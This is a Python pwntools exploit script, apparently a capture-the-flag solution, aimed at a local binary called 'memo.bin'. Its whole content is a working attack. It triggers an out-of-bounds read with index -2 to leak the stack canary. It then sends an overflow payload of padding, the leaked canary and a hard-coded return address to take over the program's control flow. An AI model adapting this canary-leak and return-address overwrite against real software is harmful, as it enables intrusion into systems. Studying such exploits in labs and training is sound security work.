#!/usr/bin/python3
from pwn import *


def exploit():
    # Write your exploit logic here.

    p = process("./memo.bin")
    for i in range(10):
        for j in range(5):
            print(p.recvline())
        print(p.recvuntil(b"(Enter W/R/M/E): "))
        p.sendline(b"W")
        print(p.recvuntil(b": "))
        p.sendline(b"A")

    for i in range(5):
        print(p.recvline())
    print(p.recvuntil(b"(Enter W/R/M/E): "))
    p.sendline(b"R")
    print(p.recvuntil(b": "))
    p.sendline(b"-2")
    
    ID = p.recvline()
    ID = ID[:len(ID)-1]
    ID_arr = ID.split(b' ')
    ID_parsed = hex(int(ID_arr[1]))
    ID_parsed = ID_parsed[2:]
    if len(ID_parsed) != 4:
        ID_parsed = "0" + ID_parsed
    arr1 = bytearray.fromhex(ID_parsed)

    Count = p.recvline()
    Count = Count[:len(Count)-1]
    Count_arr = Count.split(b' ')
    Count_parsed = hex(int(Count_arr[2]))
    Count_parsed = Count_parsed[2:]
    if len(Count_parsed) != 4:
        Count_parsed = "0" + Count_parsed
    arr2 = bytearray.fromhex(Count_parsed)
    
    Content = p.recvline()
    Content = Content[:len(Content) - 1]
    Content_arr = Content.split(b' ')
    Content_parsed = Content_arr[1][:4]
    canary = bytes([arr1[1], arr1[0], arr2[1], arr2[0], Content_arr[1][0],Content_arr[1][1],Content_arr[1][2],Content_arr[1][3]])

    for i in range(5):
        print(p.recvline())
    print(p.recvuntil(b"(Enter W/R/M/E): "))
    p.sendline(b"M")
    print(p.recvuntil(b": "))
    p.sendline(b"9")
    print(p.recvuntil(b": "))
    p.sendline(b"A" * 0x18 + canary + b"\x26\x09\x40\x00\x00\x00\x00\x00" * 2)
    
    for i in range(5):
        print(p.recvline())
    print(p.recvuntil(b"(Enter W/R/M/E): "))
    p.sendline(b"E")
    print(p.recvline())

if __name__ == "__main__":
    exploit()
